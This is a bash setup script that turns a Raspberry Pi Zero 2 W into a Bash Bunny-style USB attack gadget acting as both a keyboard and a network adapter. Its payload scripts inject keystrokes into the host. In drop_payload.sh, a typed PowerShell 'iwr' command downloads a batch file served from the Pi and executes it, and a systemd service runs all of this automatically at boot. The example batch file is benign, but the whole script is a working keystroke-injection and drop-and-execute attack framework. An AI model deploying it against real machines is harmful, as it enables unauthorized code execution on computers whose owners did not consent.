#!/bin/bash
# Full Bash Bunny-style setup for Pi Zero 2 W: Keyboard HID + RNDIS + Advanced Payloads

set -e

# Update & essentials
sudo apt update && sudo apt -y upgrade
sudo apt -y install python3 python3-pip git screen usbutils net-tools dnsmasq

# Enable SSH
sudo systemctl enable ssh
sudo systemctl start ssh

# Ensure USB gadget drivers load
if ! grep -q "^dtoverlay=dwc2" /boot/config.txt; then echo "dtoverlay=dwc2" | sudo tee -a /boot/config.txt; fi
for mod in dwc2 libcomposite; do
  if ! grep -q "^$mod" /etc/modules; then echo "$mod" | sudo tee -a /etc/modules; fi
done

# Payloads directory
mkdir -p ~/payloads

# Example advanced payloads
cat << 'EOF' > ~/payloads/send_keys.py
import sys
import time

KEYMAP = {
    'A': 0x04, 'B': 0x05, 'C': 0x06, 'D': 0x07, 'E': 0x08, 'F': 0x09,
    'G': 0x0a, 'H': 0x0b, 'I': 0x0c, 'J': 0x0d, 'K': 0x0e, 'L': 0x0f,
    'M': 0x10, 'N': 0x11, 'O': 0x12, 'P': 0x13, 'Q': 0x14, 'R': 0x15,
    'S': 0x16, 'T': 0x17, 'U': 0x18, 'V': 0x19, 'W': 0x1a, 'X': 0x1b,
    'Y': 0x1c, 'Z': 0x1d, '1': 0x1e, '2': 0x1f, '3': 0x20, '4': 0x21,
    '5': 0x22, '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26, '0': 0x27,
    ' ': 0x2c, '\n': 0x28, '.': 0x37, ',': 0x36
}
SHIFT = 0x02

def send_key(dev, code, mod=0):
    report = bytes([mod, 0, code, 0, 0, 0, 0, 0])
    dev.write(report)
    dev.write(b'\x00\x00\x00\x00\x00\x00\x00\x00')

def send_string(s):
    with open("/dev/hidg0", "wb") as dev:
        for ch in s:
            if ch.isupper():
                send_key(dev, KEYMAP.get(ch.upper(), 0), SHIFT)
            elif ch in KEYMAP:
                send_key(dev, KEYMAP[ch])
            elif ch == '\n':
                send_key(dev, KEYMAP['\n'])
            else:
                continue
            time.sleep(0.1)

if __name__ == "__main__":
    send_string(sys.argv[1])
EOF
chmod +x ~/payloads/send_keys.py

cat << 'EOF' > ~/payloads/drop_payload.sh
#!/bin/bash
# Example: Drop and execute a "malicious" payload via RNDIS
PAYLOAD_PATH="/srv/http/drop.bat"
HOST_IP="172.16.0.1"

echo "[*] Creating example payload on RNDIS share..."
sudo mkdir -p /srv/http
echo -e "@echo off\necho This is an example payload! > C:\\payload.txt" | sudo tee $PAYLOAD_PATH > /dev/null

echo "[*] Starting mini webserver on RNDIS interface..."
sudo python3 -m http.server --directory /srv/http 80 &
sleep 2

echo "[*] Sending HID keystrokes to download and run payload from Pi..."
python3 /home/pi/payloads/send_keys.py "powershell -c \"iwr http://$HOST_IP/drop.bat -OutFile C:\\drop.bat; C:\\drop.bat\"\n"

sleep 10
sudo pkill -f "http.server"
EOF
chmod +x ~/payloads/drop_payload.sh

cat << 'EOF' > ~/payloads/autorun.sh
#!/bin/bash
# Main autorun script for payload automation

# Wait for USB gadget interfaces
for i in {1..10}; do
  [ -e /dev/hidg0 ] && [ -e /sys/class/net/usb0 ] && break
  sleep 1
done

# Example: Assign RNDIS interface IP and enable DHCP server
sudo ifconfig usb0 172.16.0.1 netmask 255.255.255.0 up
sudo systemctl stop dnsmasq || true
echo -e "interface=usb0\ndhcp-range=172.16.0.10,172.16.0.20,255.255.255.0,24h" | sudo tee /etc/dnsmasq.d/usb0.conf
sudo systemctl restart dnsmasq

# Run your payloads here!
# Example: Send "Hello from Pi!" as keyboard
python3 /home/pi/payloads/send_keys.py "Hello from Pi!\n"

# Example: Drop and run a payload via RNDIS/web server/HID
bash /home/pi/payloads/drop_payload.sh
EOF
chmod +x ~/payloads/autorun.sh

# Systemd for autorun
cat << 'EOF' | sudo tee /etc/systemd/system/payloads.service > /dev/null
[Unit]
Description=Run Pi HID+RNDIS Payloads at boot
After=network.target usb-gadget.service

[Service]
Type=simple
User=pi
WorkingDirectory=/home/pi/payloads
ExecStart=/bin/bash /home/pi/payloads/autorun.sh
Restart=no

[Install]
WantedBy=multi-user.target
EOF

# USB gadget configuration
sudo mkdir -p /opt/usb-gadget
cat << 'EOF' | sudo tee /opt/usb-gadget/setup.sh > /dev/null
#!/bin/bash
cd /sys/kernel/config/usb_gadget/
mkdir -p pi_composite
cd pi_composite

echo 0x1d6b > idVendor
echo 0x0104 > idProduct
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB

mkdir -p strings/0x409
echo "deadbeef12345678" > strings/0x409/serialnumber
echo "Pi Zero 2 W" > strings/0x409/manufacturer
echo "Pi HID+RNDIS" > strings/0x409/product

mkdir -p configs/c.1
echo 250 > configs/c.1/MaxPower
mkdir -p configs/c.1/strings/0x409
echo "Config 1: HID+RNDIS" > configs/c.1/strings/0x409/configuration

mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length
echo -ne '\x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x01\x95\x05\x75\x01\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x01\x95\x06\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0' > functions/hid.usb0/report_desc

mkdir -p functions/rndis.usb0
ln -s functions/hid.usb0 configs/c.1/
ln -s functions/rndis.usb0 configs/c.1/

mkdir -p os_desc
echo "MSFT100" > os_desc/qw_sign
echo 0x0100 > os_desc/b_vendor_code
echo "1" > os_desc/use

UDC=$(ls /sys/class/udc | head -n 1)
echo $UDC > UDC
EOF
sudo chmod +x /opt/usb-gadget/setup.sh

cat << 'EOF' | sudo tee /etc/systemd/system/usb-gadget.service > /dev/null
[Unit]
Description=USB HID+RNDIS Gadget
DefaultDependencies=no
After=local-fs.target
Before=network.target

[Service]
Type=oneshot
ExecStart=/opt/usb-gadget/setup.sh

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable usb-gadget.service
sudo systemctl enable payloads.service

echo "[*] Setup complete! Reboot your Pi Zero 2 W."
echo "Customize ~/payloads/autorun.sh and add your own advanced payloads."